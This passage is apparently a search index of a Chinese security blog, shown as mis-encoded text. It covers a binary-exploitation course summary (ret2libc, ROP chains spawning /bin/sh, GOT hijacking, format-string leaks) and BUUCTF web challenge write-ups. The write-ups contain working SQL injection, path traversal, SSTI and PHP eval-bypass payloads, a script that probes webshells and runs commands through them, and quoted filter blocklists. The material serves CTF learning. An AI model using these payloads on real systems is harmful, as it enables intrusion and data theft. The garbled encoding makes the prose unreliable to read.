å‡½æ•°çš„åœ°å€å»è°ƒç”¨è¯¥å‡½æ•°ï¼Œè¯¥å‡½æ•°ä» libc.so ä¸­æ‹¿åˆ° puts çš„çœŸå®åœ°å€ï¼Œå¹¶å†™å…¥ .got.plt[3] ä¸­ã€‚è‡³æ­¤ï¼Œputs å‡½æ•°çš„å»¶è¿Ÿç»‘å®šå·¥ä½œå®Œæˆäº†ã€‚ æ¥ä¸‹æ¥ï¼Œåœ¨ç¬¬ n\u003e=1 æ¬¡è°ƒç”¨ä¸­ï¼Œå½“æˆ‘ä»¬å†æ¬¡è®¿é—® .plt[1] æ—¶ï¼Œåˆä¼šå»å– .got.plt[3] ä¸­çš„åœ°å€ï¼Œæ³¨æ„æ­¤æ—¶è¿™é‡Œå·²ç»å­˜å¥½äº† puts çš„çœŸå®åœ°å€ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±è°ƒç”¨æˆåŠŸäº†ã€‚ ","date":"2019-12-05","objectID":"/binary-exp/:13:2","tags":["æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","fsb"],"title":"æ°´æ¼«é‡‘å±±ï¼šã€ŠäºŒè¿›åˆ¶æ¼æ´åˆ©ç”¨å…¥é—¨ã€‹è¯¾ç¨‹æ€»ç»“","uri":"/binary-exp/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"ret2libc è¿™æ ·ä»¥åå°±èƒ½ä»‹ç» ret2libc äº†ï¼Œè¿™æ˜¯åœ¨æ²¡æœ‰è¯¸å¦‚ system å’Œ /bin/sh å­—ç¬¦ä¸²çš„æƒ…å†µä¸‹ï¼Œé€šè¿‡è¿”å›åˆ° libc åŠ¨æ€é“¾æ¥åº“ä¸­æŸ¥æ‰¾ system å‡½æ•°åœ°å€å’Œ /bin/sh å­—ç¬¦ä¸²åœ°å€ï¼Œæ¥æ‰§è¡Œ system(\"/bin/sh\") çš„æ”»å‡»ã€‚ä¸ºæ­¤ï¼Œæˆ‘ä»¬éœ€è¦é€šè¿‡æ ˆæº¢å‡ºæ³„éœ²å‡º libc ä¸­æŸä¸ªå‡½æ•°çš„çœŸå®åœ°å€ï¼Œä¾‹å¦‚ __libc_start_main ç­‰ï¼Œéšåä½¿ç”¨ LibcSearcher æœç´¢å‡ºç¨‹åºä½¿ç”¨çš„ libc ç‰ˆæœ¬ï¼Œä»è€Œè·å¾— libc åŸºå€ï¼Œä»¥åŠ system å’Œ /bin/sh çš„åç§»é‡ã€‚å°†åŸºå€å’Œåç§»ç›¸åŠ å°±å¯ä»¥å¾—åˆ°ä¸¤è€…çš„çœŸå®åœ°å€ã€‚è¿™ç§æ”»å‡»ä¸ä»…å¯ä»¥ç»•è¿‡ NX ä¿æŠ¤ï¼ŒåŒæ—¶ç”±äº PIE ä¸ä¼šéšæœºåŒ–å‡½æ•°åœ°å€çš„ä½ 12 ä½ï¼Œè€Œæ³„éœ²å‡º __libc_start_main çš„ä½ 12 ä½å°±å¯ä»¥ç¡®å®š libc ç‰ˆæœ¬ï¼Œret2libc æ”»å‡»åœ¨ PIE ä¿æŠ¤ä¸‹ä¹Ÿä¸ä¼šå¤±æ•ˆã€‚ ","date":"2019-12-05","objectID":"/binary-exp/:13:3","tags":["æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","fsb"],"title":"æ°´æ¼«é‡‘å±±ï¼šã€ŠäºŒè¿›åˆ¶æ¼æ´åˆ©ç”¨å…¥é—¨ã€‹è¯¾ç¨‹æ€»ç»“","uri":"/binary-exp/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"ROP \u0026 ret2syscall åŒæ ·æˆ‘ä»¬è¿˜å¯ä»¥ ret2syscallã€‚æˆ‘ä»¬æƒ³åšçš„å°±æ˜¯æ„é€ ç³»ç»Ÿè°ƒç”¨ execve(\"/bin/sh\",NULL,NULL)ã€‚ä¸ºæ­¤ï¼Œæˆ‘ä»¬éœ€è¦ï¼š è®© eax ç­‰äº 0xbï¼ˆexecve çš„ç³»ç»Ÿè°ƒç”¨å·ï¼‰ æ‰¾åˆ° /bin/sh å­—ç¬¦ä¸²çš„åœ°å€ è®© ebx ç­‰äº /bin/sh å­—ç¬¦ä¸²çš„åœ°å€ è®© ecx å’Œ edx ç­‰äº 0 æ‰¾åˆ° int 0x80 è¯­å¥çš„åœ°å€ï¼Œå¹¶è¿”å›åˆ°è¿™å¥è¯­å¥ä¸Š å¯ä»¥å‘ç°ï¼Œè¿™é‡Œæˆ‘ä»¬éœ€è¦æ§åˆ¶å¯„å­˜å™¨çš„å€¼ï¼Œä½†æ˜¯æˆ‘ä»¬æ˜¯æ— æ³•ç›´æ¥æ§åˆ¶çš„ï¼Œè€Œæ˜¯éœ€è¦é€šè¿‡ä¸€äº› gadgets æ¥æ§åˆ¶ã€‚ å›é¡¾ x86 æ±‡ç¼–éƒ¨åˆ†ï¼Œæˆ‘ä»¬ä»‹ç»äº† push å’Œ pop ä¸¤ç§å¯¹ç§°çš„æ“ä½œã€‚ç„¶è€Œï¼Œæ²¡æœ‰äººè§„å®šè¿™ä¸¤ä¸ªæ“ä½œå¿…é¡»æˆå¯¹å‡ºç°ã€‚å¦‚æœæˆ‘ä»¬å…ˆå¸ƒç½®å¥½æ ˆé¡¶çš„å€¼ï¼Œç„¶åè·³è½¬åˆ° pop eax æŒ‡ä»¤æ‰€åœ¨çš„åœ°å€å¹¶æ‰§è¡Œï¼Œé‚£ä¹ˆæ ˆé¡¶çš„å€¼å°±ä¼šè¢«èµ‹å€¼ç»™ eaxï¼Œè¿™æ ·ï¼Œæˆ‘ä»¬ç›¸å½“äºæ§åˆ¶äº†å¯„å­˜å™¨çš„å€¼ã€‚ ä½†æ˜¯ï¼Œè·³è½¬åˆ° pop eax åï¼Œæˆ‘ä»¬è¿˜éœ€è¦æ§åˆ¶ ebx ç­‰å¯„å­˜å™¨ï¼Œè¿˜éœ€è¦è·³è½¬åˆ°åˆ«çš„åœ°æ–¹ï¼Œæ­¤æ—¶çš„è·³è½¬æˆ‘ä»¬åŒæ ·è¦é€šè¿‡ä¿®æ”¹è¿”å›åœ°å€å®ç°ï¼Œå› æ­¤æˆ‘ä»¬å¿…é¡»è¦æœ‰è¿”å›è¯­å¥ï¼Œä¹Ÿå°±æ˜¯ retã€‚å› æ­¤ pop eax; ret è¿™æ ·çš„è¯­å¥æˆ‘ä»¬å°±ç§°ä¹‹ä¸ºä¸€ä¸ª gadgetã€‚ æˆ‘ä»¬å¯ä»¥é€šè¿‡æ ˆæº¢å‡ºå…ˆåœ¨æ ˆä¸Šå¸ƒç½®å¥½æˆ‘ä»¬æƒ³ pop å‡ºå»çš„å€¼ï¼Œé€šè¿‡ ROPgadget å·¥å…·å¯»æ‰¾ä¸€äº›è¿™æ ·çš„ gadgetsï¼ˆè¿˜å¯ä»¥æ‰¾ /bin/sh åœ°å€å’Œ int 0x80 åœ°å€ï¼‰ä¹Ÿä¾æ¬¡æ”¾åˆ°æ ˆä¸Šï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±æ„é€ äº†ä¸€æ¡ ROP(Return Oriented Programming) é“¾ï¼š | int 0x80 | -------------------------------- | addr of /bin/sh | -------------------------------- | 0 | -------------------------------- | 0 | -------------------------------- | pop edx; pop ecx; pop ebx; ret | -------------------------------- | 0xb | -------------------------------- | pop eax; ret | ","date":"2019-12-05","objectID":"/binary-exp/:13:4","tags":["æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","fsb"],"title":"æ°´æ¼«é‡‘å±±ï¼šã€ŠäºŒè¿›åˆ¶æ¼æ´åˆ©ç”¨å…¥é—¨ã€‹è¯¾ç¨‹æ€»ç»“","uri":"/binary-exp/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"GOT Hijacking æ ˆæº¢å‡ºéƒ¨åˆ†æœ€åä»‹ç»çš„æ˜¯ GOT Hijackingï¼Œä¹Ÿå°±æ˜¯ GOT è¡¨åŠ«æŒã€‚å½“ç¨‹åºå¼€å¯ Partial RELRO æ—¶ï¼ŒGOT è¡¨æ˜¯å¯å†™çš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥å°†ä¸€ä¸ªç°æœ‰çš„æ™®é€šå‡½æ•°ä¾‹å¦‚ fflush çš„ GOT è¡¨åœ°å€æ”¾åœ¨æ ˆä¸Šï¼Œéšååˆ©ç”¨ç¨‹åºæ¼æ´ï¼ˆå¦‚ scanf ä¸åŠ  \u0026 ç­‰ï¼‰å‘è¯¥åœ°å€å†™å…¥å¦ä¸€ä¸ªåœ°å€ï¼Œå¦‚ system(\"/bin/sh\") çš„åœ°å€ï¼Œé‚£ä¹ˆå½“æˆ‘ä»¬æ‰§è¡Œ fflush() æ—¶ï¼Œç”±äºå…¶ GOT è¡¨å·²ç»è¢«åŠ«æŒåˆ°äº† system(\"/bin/sh\")ï¼Œå®é™…æ‰§è¡Œçš„æ˜¯åè€…ã€‚ ","date":"2019-12-05","objectID":"/binary-exp/:13:5","tags":["æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","fsb"],"title":"æ°´æ¼«é‡‘å±±ï¼šã€ŠäºŒè¿›åˆ¶æ¼æ´åˆ©ç”¨å…¥é—¨ã€‹è¯¾ç¨‹æ€»ç»“","uri":"/binary-exp/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ è¯¾ç¨‹æœ€åä»‹ç»çš„æ˜¯æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œå¤§å®¶éƒ½æ¯”è¾ƒç†Ÿæ‚‰æ ¼å¼åŒ–å­—ç¬¦ä¸²ã€‚å…¶å®Œæ•´æ ¼å¼å½¢å¦‚ï¼š %[parameter][flags][field width][.precision][length]type è¿™é‡Œæˆ‘ä»¬ä¸»è¦å…³æ³¨ parameter å’Œ typeã€‚parameter å¤„ä¸€ä¸ªå¹¿ä¸ºäººçŸ¥çš„æ”»å‡»ç‚¹æ˜¯ n$ï¼Œä¾‹å¦‚ï¼š printf(\"%2$d %2$#x; %1$d %1$#x\",16,17) è¿™å¥è¯­å¥ä¸­ï¼Œ2$ å°±æ˜¯å€¼æ ¼å¼åŒ–å­—ç¬¦ä¸²åçš„ç¬¬ 2 ä¸ªå‚æ•°ã€‚ ç±»ä¼¼åœ°ï¼Œtype ä¸­çš„æ”»å‡»ç‚¹åœ¨äº %n è¿™ä¸ªç±»å‹ï¼ŒæŒ‡å®šä¸ºè¯¥ç±»å‹æ—¶ï¼Œä¸è¾“å‡ºï¼Œè€Œæ˜¯å°†å·²æˆåŠŸè¾“å‡ºçš„å­—ç¬¦æ•°å†™å…¥å¯¹åº”çš„æ•´å‹æŒ‡é’ˆå‚æ•°æ‰€æŒ‡çš„å˜é‡ã€‚è¿™å¯ä»¥ç”¨æ¥å†™å†…å­˜ï¼Œä¸è¿‡è¯¾ç¨‹å¹¶æ²¡æœ‰æ¶‰åŠè¿™ä¸€ç‚¹ã€‚ ä¸ºäº†åˆ©ç”¨è¯¥æ¼æ´ï¼Œé¦–å…ˆè¦ç†è§£æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„å·¥ä½œåŸç†ã€‚å¯¹äºè¯­å¥ï¼› printf(\"Color %s, Number %d, Float %4.2f\", \"red\", 123456, 3.1416); ä¼šè¾“å‡º Color red, Number 123456, Float 3.14 æ ˆä¸Šå¸ƒå±€ä¸ºï¼š | 3.1416 | ------------------------- | 123456 | ------------------------- | addr of \"red\" | ------------------------- | addr of \"Color %s, ...\" | printf å‡½æ•°åœ¨è¯»æ ¼å¼åŒ–å­—ç¬¦ä¸²æ—¶ï¼Œå¦‚æœé‡åˆ° %ï¼Œé‚£ä¹ˆå°±ä¼šå»è¯»å–å¯¹åº”ä½ç½®çš„å‚æ•°å¹¶è§£æï¼Œè¿™ä¸ªå‚æ•°ä½äºæ ˆä¸Šã€‚é‚£ä¹ˆï¼Œå¦‚æœæˆ‘çš„è¯­å¥æ˜¯ï¼š printf(\"Color %s, Number %d, Float %4.2f\"); å³å‚æ•°ä¸ªæ•°ä¸åŒ¹é…ï¼Œä¼šæ€ä¹ˆæ ·å‘¢ï¼Ÿ ç­”æ¡ˆæ˜¯ printf ç…§å¸¸è§£æï¼Œæ­¤æ—¶æ ˆä¸ŠåŸæœ¬åº”è¯¥æ”¾å‚æ•°çš„é‚£ä¸ªä½ç½®ä¸Šçš„å†…å®¹å°±ä¼šè¢«è¯»å–å¹¶æ‰“å°å‡ºæ¥ã€‚åˆ©ç”¨è¿™ä¸ªæ¼æ´ï¼Œæˆ‘ä»¬å°±å¯ä»¥æ³„éœ²æ ˆå†…å­˜ã€‚å®é™…ä¸Šï¼Œå¯ä»¥æ³„éœ²ä»»æ„åœ°å€å†…å­˜ã€‚ ä¸¾ä¸ªä¾‹å­ï¼Œå½“ç¨‹åºè¿è¡Œæ—¶æˆ‘ä»¬å‘ç°ç”¨æˆ·è¾“å…¥çš„å‚æ•°è¢«å­˜å‚¨åœ¨äº†æ ˆä¸Šï¼Œå¹¶ä¸”æ ˆä¸Šè¿˜æœ‰ __libc_start_main çš„åœ°å€ã€‚é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥è®¡ç®—ä¸¤è€…åœ¨æ ˆä¸Šçš„åç§»é‡ offsetï¼Œéšåï¼š é™¤ä»¥ 4ï¼ˆ32 ä½ï¼‰ é™¤ä»¥ 8 ååŠ  6ï¼ˆ64 ä½ï¼Œåˆ«å¿˜äº† 6 ä¸ªå­˜å‚æ•°çš„å¯„å­˜å™¨ï¼‰ å¾—åˆ°çš„å°±æ˜¯ï¼Œ__libc_start_main å¯ä»¥è¢«è®¤ä¸ºæ˜¯ printf çš„ç¬¬å‡ ä¸ªå‚æ•°ã€‚å‡å¦‚æ˜¯ç¬¬ 11 ä¸ªå‚æ•°ï¼Œé‚£ä¹ˆæˆ‘ä»¬åªè¦æ„é€ è¯­å¥ printf(\"%11$p\"); å³å¯æ³„éœ² __libc_start_main çš„åœ°å€ï¼Œä»è€Œå®æ–½ ret2libc æ”»å‡»ã€‚ ","date":"2019-12-05","objectID":"/binary-exp/:14:0","tags":["æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","fsb"],"title":"æ°´æ¼«é‡‘å±±ï¼šã€ŠäºŒè¿›åˆ¶æ¼æ´åˆ©ç”¨å…¥é—¨ã€‹è¯¾ç¨‹æ€»ç»“","uri":"/binary-exp/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"å‚è€ƒèµ„æ–™ https://pwnable.kr/ https://ctf-wiki.github.io/ctf-wiki/pwn/readme-zh/ https://ctf.bugku.com/challenges https://zhuanlan.zhihu.com/p/25816426 http://security.cs.rpi.edu/courses/binexp-spring2015/ https://ropemporium.com/guide.html æ‰€æœ‰ä½¿ç”¨çš„å·¥å…·çš„å®˜æ–¹æ–‡æ¡£ ã€Šæ·±å…¥ç†è§£è®¡ç®—æœºç³»ç»Ÿã€‹ï¼ˆCS: APPï¼‰ ","date":"2019-12-05","objectID":"/binary-exp/:15:0","tags":["æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","fsb"],"title":"æ°´æ¼«é‡‘å±±ï¼šã€ŠäºŒè¿›åˆ¶æ¼æ´åˆ©ç”¨å…¥é—¨ã€‹è¯¾ç¨‹æ€»ç»“","uri":"/binary-exp/"},{"categories":["Web å®‰å…¨"],"content":"å¶ç„¶å‘ç°çš„ BUUCTFï¼ŒçœŸçš„éå¸¸å¥½ç”¨äº†ã€‚ ","date":"2019-11-29","objectID":"/buu-web/:0:0","tags":["SQLi","æ–‡ä»¶ä¸Šä¼ ","SSRF","ååºåˆ—åŒ–","PHP"],"title":"BUUCTF Web ç»ƒä¹ è®°å½•","uri":"/buu-web/"},{"categories":["Web å®‰å…¨"],"content":"[HCTF 2018]WarmUp F12 å‘ç° source.php å¾—æºç ï¼š \u003c?php highlight_file(__FILE__); class emmm { public static function checkFile(\u0026$page) { $whitelist = [\"source\"=\u003e\"source.php\",\"hint\"=\u003e\"hint.php\"]; if (! isset($page) || !is_string($page)) { echo \"you can't see it\"; return false; } if (in_array($page, $whitelist)) { return true; } $_page = mb_substr( $page, 0, mb_strpos($page .'?','?') ); if (in_array($_page, $whitelist)) { return true; } $_page = urldecode($page); $_page = mb_substr( $_page, 0, mb_strpos($_page .'?','?') ); if (in_array($_page, $whitelist)) { return true; } echo \"you can't see it\"; return false; } } if (! empty($_REQUEST['file']) \u0026\u0026 is_string($_REQUEST['file']) \u0026\u0026 emmm::checkFile($_REQUEST['file']) ) { include $_REQUEST['file']; exit; } else { echo \"\u003cbr\u003e\u003cimg src=\\\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\\\"/\u003e\"; } ?\u003e å‘ç°å­˜åœ¨ hint.phpï¼š flag not here, and flag in ffffllllaaaagggg ç»“åˆä¸Šè¿°ä»£ç ï¼Œå¯ä»¥ç¡®å®šæ˜¯åˆ©ç”¨æ–‡ä»¶åŒ…å«è¯»å– ffffllllaaaagggg æ–‡ä»¶ã€‚ä¸ºæ­¤ï¼Œæˆ‘ä»¬éœ€è¦æä¾› GET å‚æ•° fileã€‚ æ³¨æ„åˆ° file å‚æ•°çš„å€¼ä¼šè¢«ç»è¿‡å¦‚ä¸‹å¤„ç†ï¼š $_page = mb_substr( $page, 0, mb_strpos($page .'?','?') ); é‚£ä¹ˆå¦‚æœæˆ‘ä»¬åœ¨ä¸­é—´æ’å…¥ä¸€ä¸ª ?ï¼Œå°±å¯ä»¥è¾¾åˆ°æˆªæ–­çš„æ•ˆæœã€‚æ‰€ä»¥å°è¯• ?file=hint.php?ffffllllaaaagggg å‘ç°æ— æ³•è¯»å–åˆ°å†…å®¹ï¼Œå› æ­¤çŒœæµ‹ hint.php? è¢«å½“ä½œäº†æ–‡ä»¶åçš„ä¸€éƒ¨åˆ†ï¼Œéœ€è¦ä½¿ç”¨ç›¸å¯¹è·¯å¾„è¿›è¡Œç›®å½•ç©¿è¶Šï¼š ?file=hint.php?../../../../../ffffllllaaaagggg ","date":"2019-11-29","objectID":"/buu-web/:1:0","tags":["SQLi","æ–‡ä»¶ä¸Šä¼ ","SSRF","ååºåˆ—åŒ–","PHP"],"title":"BUUCTF Web ç»ƒä¹ è®°å½•","uri":"/buu-web/"},{"categories":["Web å®‰å…¨"],"content":"[å¼ºç½‘æ¯ 2019] éšä¾¿æ³¨ å•å¼•å·å¯ä»¥å‘ç°å­˜åœ¨æ³¨å…¥ï¼Œä½†å°è¯•æ³¨å…¥æ—¶é¡µé¢è¿”å› return preg_match(\"/select|update|delete|drop|insert|where|\\./i\",$inject); è¿™è¯´æ˜æ— æ³•é€šè¿‡å¸¸è§„æ‰‹æ®µè¿›è¡Œæ³¨å…¥ï¼Œå› æ­¤å°è¯•å †å æ³¨å…¥ï¼š 1';show databases; 1';show tables; å¾—åˆ°éœ€è¦çš„è¡¨å 1919810931114514ï¼Œä½†æ˜¯ç”±äº select ç­‰æŸ¥è¯¢å…³é”®å­—è¢«è¿‡æ»¤ï¼ŒæŸ¥å­—æ®µå†…å®¹éœ€è¦å¦è¾Ÿè¹Šå¾„ã€‚è¿™é‡Œä½¿ç”¨äº†é¢„å¤„ç†è¯­å¥ï¼š 1';sEt @poc=concat(char(115,101,108,101,99,116,32),'* from `1919810931114514`');prEpare poc from @poc;exEcute poc;# æ³¨æ„è¿™é‡Œå¯ä»¥ä½¿ç”¨ char ç»•è¿‡ã€å¤§å°å†™ç»•è¿‡ï¼Œå¹¶ä¸”çº¯æ•°å­—è¡¨åéœ€è¦ç”¨åå¼•å·åŒ…èµ·æ¥ã€‚ ","date":"2019-11-29","objectID":"/buu-web/:2:0","tags":["SQLi","æ–‡ä»¶ä¸Šä¼ ","SSRF","ååºåˆ—åŒ–","PHP"],"title":"BUUCTF Web ç»ƒä¹ è®°å½•","uri":"/buu-web/"},{"categories":["Web å®‰å…¨"],"content":"[æŠ¤ç½‘æ¯ 2018]easy_tornado æˆ‘ä»¬éœ€è¦è®¡ç®—çš„ hash æ˜¯ md5(cookie_secret+md5(filename))ï¼Œå·²ç»è·å¾—äº† flag çš„æ–‡ä»¶åï¼Œè¿˜éœ€è¦ cookie_secretã€‚ç”±äºæ˜¯ tornado æ¡†æ¶ï¼Œå¯ä»¥å°è¯• SSTIã€‚ ä¿®æ”¹ filehash è¿›å…¥é”™è¯¯é¡µé¢ /error?msg=Errorï¼Œæµ‹è¯•å‘ç° msg å­˜åœ¨ SSTIï¼Œä½¿ç”¨ msg={{handler.settings}} å³å¯è·å¾— cookie_secretã€‚æœ€åè®¡ç®— MD5 å¾— payloadï¼š /file?filename=/fllllllllllllag\u0026filehash=a47f809c580850840a5562488d72a3df ","date":"2019-11-29","objectID":"/buu-web/:3:0","tags":["SQLi","æ–‡ä»¶ä¸Šä¼ ","SSRF","ååºåˆ—åŒ–","PHP"],"title":"BUUCTF Web ç»ƒä¹ è®°å½•","uri":"/buu-web/"},{"categories":["Web å®‰å…¨"],"content":"[SUCTF 2019]EasySQL æºç æ³„éœ²ï¼š \u003c?php session_start(); include_once \"config.php\"; $post = array(); $get = array(); global $MysqlLink; //GetPara(); $MysqlLink = mysqli_connect(\"localhost\",$datauser,$datapass); if(!$MysqlLink){ die(\"Mysql Connect Error!\"); } $selectDB = mysqli_select_db($MysqlLink,$dataName); if(!$selectDB){ die(\"Choose Database Error!\"); } foreach ($_POST as $k=\u003e$v){ if(!empty($v)\u0026\u0026is_string($v)){ $post[$k] = trim(addslashes($v)); } } foreach ($_GET as $k=\u003e$v){ } } //die(); ?\u003e\u003chtml\u003e \u003chead\u003e \u003c/head\u003e \u003cbody\u003e \u003ca\u003e Give me your flag, I will tell you if the flag is right. \u003c/ a\u003e \u003cform action=\"\"method=\"post\"\u003e \u003cinput type=\"text\"name=\"query\"\u003e \u003cinput type=\"submit\"\u003e \u003c/form\u003e \u003c/body\u003e \u003c/html\u003e \u003c?php if(isset($post['query'])){ $BlackList = \"prepare|flag|unhex|xml|drop|create|insert|like|regexp|outfile|readfile|where|from|union|update|delete|if|sleep|extractvalue|updatexml|or|and|\u0026|\\\"\"; //var_dump(preg_match(\"/{$BlackList}/is\",$post['query'])); if(preg_match(\"/{$BlackList}/is\",$post['query'])){ //echo $post['query']; die(\"Nonono.\"); } if(strlen($post['query'])\u003e40){ die(\"Too long.\"); } $sql = \"select\".$post['query'].\"||flag from Flag\"; mysqli_multi_query($MysqlLink,$sql); do{ if($res = mysqli_store_result($MysqlLink)){ while($row = mysqli_fetch_row($res)){ print_r($row); } } }while(@mysqli_next_result($MysqlLink)); } ?\u003e ä» sql è¯­å¥å¯ä»¥çœ‹å‡ºå­˜åœ¨å †å æ³¨å…¥ï¼Œä¸” flag è¢« || æ‹¼æ¥åœ¨äº†è¾“å…¥çš„åé¢ã€‚å› æ­¤ä¸€ç§åŠæ³•æ˜¯æŠŠç®¡é“å˜æˆè¿æ¥ç¬¦ï¼Œç„¶åæŸ¥è¯¢ 1||flagï¼š 1; set sql_mode=pipes_as_concat;select 1 å¦ä¸€ç§åŠæ³•æ˜¯ç›´æ¥è¾“å…¥ *,1ï¼Œä»è€Œæ„é€  select *,1||flag from Flagï¼Œè¿™é‡Œçš„ || å°±æ˜¯é»˜è®¤çš„æˆ–è¿ç®—ã€‚ ","date":"2019-11-29","objectID":"/buu-web/:4:0","tags":["SQLi","æ–‡ä»¶ä¸Šä¼ ","SSRF","ååºåˆ—åŒ–","PHP"],"title":"BUUCTF Web ç»ƒä¹ è®°å½•","uri":"/buu-web/"},{"categories":["Web å®‰å…¨"],"content":"[HCTF 2018]admin æ³¨å†Œæ—¶è¾“å…¥ unicode å­—ç¬¦ä¼šæŠ¥é”™ï¼Œç”±äºå¼€å¯äº† debug æ¨¡å¼ï¼Œç›´æ¥å¯ä»¥æ‹¿åˆ° python çš„ shellï¼Œä» index.html ä¸­è¯» flagã€‚è¿™ä¸ªåº”è¯¥æ˜¯ BUU å¹³å°çš„éé¢„æœŸã€‚ å®é™…ä¸Šï¼Œæœ¬é¢˜é¢„æœŸè§£æ˜¯åˆ©ç”¨ Unicode åŒå½¢å­—ï¼Œæ³¨å†Œ á´€dmin å¹¶ç™»é™†ï¼Œç„¶åä¿®æ”¹å¯†ç å³å¯ä¿®æ”¹ admin çš„å¯†ç ï¼Œä½†æ˜¯åŒæ ·å‡ºç°äº†å¾ˆå¤šéé¢„æœŸï¼Œå…·ä½“å‚è€ƒ å‡ºé¢˜äººé¢˜è§£ã€‚ ","date":"2019-11-29","objectID":"/buu-web/:5:0","tags":["SQLi","æ–‡ä»¶ä¸Šä¼ ","SSRF","ååºåˆ—åŒ–","PHP"],"title":"BUUCTF Web ç»ƒä¹ è®°å½•","uri":"/buu-web/"},{"categories":["Web å®‰å…¨"],"content":"[RoarCTF 2019]Easy Calc é¦–é¡µå¯ä»¥å‘ç° js ä»£ç ï¼Œä¹Ÿå°±æ˜¯è‡ªå®šä¹‰çš„ wafï¼š $('#calc').submit(function(){ $.ajax({ url:\"calc.php?num=\"+encodeURIComponent($(\"#content\").val()), type:'GET', success:function(data){ $(\"#result\").html(`\u003cdiv class=\"alert alert-success\"\u003e \u003cstrong\u003e ç­”æ¡ˆ:\u003c/strong\u003e${data}\u003c/div\u003e`); }, error:function(){ alert(\" è¿™å•¥? ç®—ä¸æ¥!\"); } }) return false; }) å¯ä»¥å‘ç°æœ‰ calc.phpï¼Œè®¿é—®ç›´æ¥å¾—åˆ°æºç ï¼š \u003c?php error_reporting(0); if(!isset($_GET['num'])){ show_source(__FILE__); }else{ $str = $_GET['num']; $blacklist = ['', '\\t', '\\r', '\\n','\\'','\"','`','\\[','\\]','\\$','\\\\','\\^']; foreach ($blacklist as $blackitem) { if (preg_match('/'. $blackitem .'/m', $str)) { die(\"what are you want to do?\"); } } eval('echo'.$str.';'); } ?\u003e ç»•è¿‡ php é»‘åå•æœ¬èº«ä¸éš¾ï¼Œä½†æ˜¯ waf ä¸­ä¼šå…ˆè¿›è¡Œä¸€æ¬¡ encodeURIComponentã€‚è¿™é‡Œç”¨åˆ°çš„ç»•è¿‡ waf æŠ€å·§å°±æ˜¯ç”¨ num å‚æ•°è€Œé num å‚æ•°ï¼Œè¿™æ ·åšå¯ä»¥æˆåŠŸçš„åŸå› åœ¨äº php ä¼šå°è¯•å°†ä¼ å…¥çš„å‚æ•°å˜ä¸ºåˆæ³•å˜é‡åï¼Œå³ strip æ‰é¦–å°¾ç©ºæ ¼ã€åŠ ä¸‹åˆ’çº¿ç­‰ç­‰ï¼Œå› æ­¤ num å°±ä¼šè¢«å¤„ç†æˆ numï¼ŒæˆåŠŸè¿›å…¥ else é€»è¾‘ï¼Œå‰©ä¸‹çš„å°±æ˜¯ç»•é»‘åå•äº†ï¼š /calc.php?%20num=var_dump(scandir(chr(47))) å¯ä»¥å‘ç° flag æ–‡ä»¶ /f1aggï¼ŒåŒæ ·æ–¹æ³•è¯»å‡ºå³å¯ï¼š /calc.php?%20num=var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))) ","date":"2019-11-29","objectID":"/buu-web/:6:0","tags":["SQLi","æ–‡ä»¶ä¸Šä¼ ","SSRF","ååºåˆ—åŒ–","PHP"],"title":"BUUCTF Web ç»ƒä¹ è®°å½•","uri":"/buu-web/"},{"categories":["Web å®‰å…¨"],"content":"[å¼ºç½‘æ¯ 2019] é«˜æ˜çš„é»‘å®¢ æä¾›äº† www.tar.gzï¼Œé‡Œé¢æœ‰ 3000 + ä¸ª php æ–‡ä»¶ï¼Œéƒ½å«æœ‰ç±»ä¼¼ä¸€å¥è¯çš„éƒ¨åˆ†ï¼Œä½†æ˜¯å¤§å¤šä¸èƒ½ç”¨ã€‚éœ€è¦å†™è„šæœ¬æ‰¾åˆ°èƒ½ç”¨çš„ä¸€å¥è¯æœ¨é©¬ï¼š import os import re import requests filenames = os.listdir('/var/www/html/src') pattern = re.compile(r\"\\$_[GEPOST]{3,4}\\[.*\\]\") for name in filenames: print(name) with open('/var/www/html/src/'+name,'r') as f: data = f.read() result = list(set(pattern.findall(data))) for ret in result: try: command = 'uname' flag = 'Linux' if 'GET' in ret: passwd = re.findall(r\"'(.*)'\",ret)[0] r = requests.get(url='http://localhost/'+ name +'?'+ passwd +'='+ command) if flag in r.text: print('GET /{}?{}=cat /flag'.format(name,passwd)) break elif 'POST' in ret: passwd = re.findall(r\"'(.*)'\",ret)[0] r = requests.post(url='http://localhost/'+ name,data={passwd:command}) if flag in r.text: print('POST /{}?{}=cat /flag'.format(name,passwd)) break except: pass ","date":"2019-11-29","objectID":"/buu-web/:7:0","tags":["SQLi","æ–‡ä»¶ä¸Šä¼ ","SSRF","ååºåˆ—åŒ–","PHP"],"title":"BUUCTF Web ç»ƒä¹ è®°å½•","uri":"/buu-web/"},{"categories":["Web å®‰å…¨"],"content":"[SUCTF 2019]CheckIn å¯ä»¥ä¸Šä¼ æ–‡ä»¶ï¼Œä½†æ˜¯ä¼šå¯¹åç¼€åã€æ–‡ä»¶å¤´è¿›è¡Œæ£€æŸ¥ï¼ŒåŒæ—¶æ–‡ä»¶ä¸­ä¸èƒ½å­˜åœ¨ \u003c?ã€‚åè€…ç”¨ \u003cscript language=\"php\"\u003e å°±å¯ä»¥ç»•è¿‡ï¼Œå‰è€…å¯ä»¥ä¸Šä¼ å›¾ç‰‡é©¬ã€‚éšåå°±éœ€è¦æˆ‘ä»¬å»åŒ…å«è¿™ä¸ªå›¾ç‰‡é©¬ã€‚ å¯ä»¥çœ‹åˆ°ä¸Šä¼ 